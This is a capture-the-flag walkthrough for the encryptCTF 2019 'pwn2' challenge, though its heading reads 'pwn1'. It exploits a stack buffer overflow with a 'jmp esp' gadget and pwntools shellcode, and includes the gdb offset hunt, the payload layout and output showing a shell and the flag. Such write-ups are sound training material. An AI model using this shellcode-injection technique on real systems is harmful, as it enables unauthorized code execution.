# pwn : pwn1

```
Given netcat connection : `nc 104.154.106.182 3456`
Binary file pwn1 32 bit executable
```
* Checksec of Binary [pwn2](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn2/pwn2?raw=true)
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```
* No canary   : bufferoverflow
* NX disabled : assembly execution on stack 

* Interesting Function lol
```assembly
gdb-peda$ disass lol
Dump of assembler code for function lol:
   0x08048541 <+0>:	push   ebp
   0x08048542 <+1>:	mov    ebp,esp
   0x08048544 <+3>:	jmp    esp
   0x08048546 <+5>:	pop    ebp
   0x08048547 <+6>:	ret    
End of assembler dump.
```
* Which jumps to esp (stack) ; We can execute the shell code on stack using lol

* Finding OFFSET
```assembly
$ gdb ./pwn2
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048548 <+0>:	push   ebp
   0x08048549 <+1>:	mov    ebp,esp
   0x0804854b <+3>:	and    esp,0xfffffff0
   0x0804854e <+6>:	sub    esp,0x30
   0x08048551 <+9>:	mov    eax,ds:0x804a040
   0x08048556 <+14>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804855e <+22>:	mov    DWORD PTR [esp+0x8],0x2
   0x08048566 <+30>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804856e <+38>:	mov    DWORD PTR [esp],eax
   0x08048571 <+41>:	call   0x8048420 <setvbuf@plt>
   0x08048576 <+46>:	mov    DWORD PTR [esp],0x8048673
   0x0804857d <+53>:	call   0x80483c0 <printf@plt>
   0x08048582 <+58>:	lea    eax,[esp+0x10]
   0x08048586 <+62>:	mov    DWORD PTR [esp],eax
   0x08048589 <+65>:	call   0x80483d0 <gets@plt>
   0x0804858e <+70>:	mov    DWORD PTR [esp+0x4],0x8048670
   0x08048596 <+78>:	lea    eax,[esp+0x10]
   0x0804859a <+82>:	mov    DWORD PTR [esp],eax
   0x0804859d <+85>:	call   0x80483b0 <strcmp@plt>
   0x080485a2 <+90>:	test   eax,eax
   0x080485a4 <+92>:	jne    0x80485ad <main+101>
   0x080485a6 <+94>:	call   0x804852d <run_command_ls>
   0x080485ab <+99>:	jmp    0x80485c1 <main+121>
   0x080485ad <+101>:	lea    eax,[esp+0x10]
   0x080485b1 <+105>:	mov    DWORD PTR [esp+0x4],eax
   0x080485b5 <+109>:	mov    DWORD PTR [esp],0x8048676
   0x080485bc <+116>:	call   0x80483c0 <printf@plt>
   0x080485c1 <+121>:	mov    DWORD PTR [esp],0x8048693
   0x080485c8 <+128>:	call   0x80483e0 <puts@plt>
   0x080485cd <+133>:	mov    eax,0x0
   0x080485d2 <+138>:	leave  
   0x080485d3 <+139>:	ret    
End of assembler dump.
gdb-peda$ b*0x080485d3
Breakpoint 1 at 0x80485d3
gdb-peda$ r < inp
Starting program: /home/aj/Videos/CTF-writeups/Encrypt-2019/pwn2/pwn2 < inp
$ bash: command not found: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Bye!

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xf7facdc7 --> 0xfad8900a 
EDX: 0xf7fad890 --> 0x0 
ESI: 0xf7fac000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xffffd10c ("LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EIP: 0x80485d3 (<main+139>:	ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485c8 <main+128>:	call   0x80483e0 <puts@plt>
   0x80485cd <main+133>:	mov    eax,0x0
   0x80485d2 <main+138>:	leave  
=> 0x80485d3 <main+139>:	ret    
   0x80485d4:	xchg   ax,ax
   0x80485d6:	xchg   ax,ax
   0x80485d8:	xchg   ax,ax
   0x80485da:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffd10c ("LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0004| 0xffffd110 ("MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0008| 0xffffd114 ("NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0012| 0xffffd118 ("OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0016| 0xffffd11c ("PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0020| 0xffffd120 ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0024| 0xffffd124 ("RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0028| 0xffffd128 ("SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485d3 in main ()
gdb-peda$ 
```
* The function is trying to return to 'LLLL' ; so padding is 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK' or `'A'*44`

* pwn tools defaults provides the shellcodes 
```py
from pwn import *

context.update(arch='i386', os='linux')
shellcode = shellcraft.sh()
shellcode = asm(shellcode)
```
* payload = padding+lol+shellcode

### Python Script [exp.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn2/exp.py)
### output :::
```
$ python exp.py 
[*] '/home/aj/Videos/CTF-writeups/Encrypt-2019/pwn2/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process './pwn2': pid 5850
[*] Switching to interactive mode
$ bash: command not found: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90A\x85\x0jhh///sh/bin\x89�h\x814$ri1�Qj\x04Y�Q��1�j\x0bX̀
Bye!
$ ls
flag.txt  pwn2
$ cat flag.txt
encryptCTF{N!c3_j0b_jump3R}
$ 
```

### flag is :: `encryptCTF{N!c3_j0b_jump3R}`
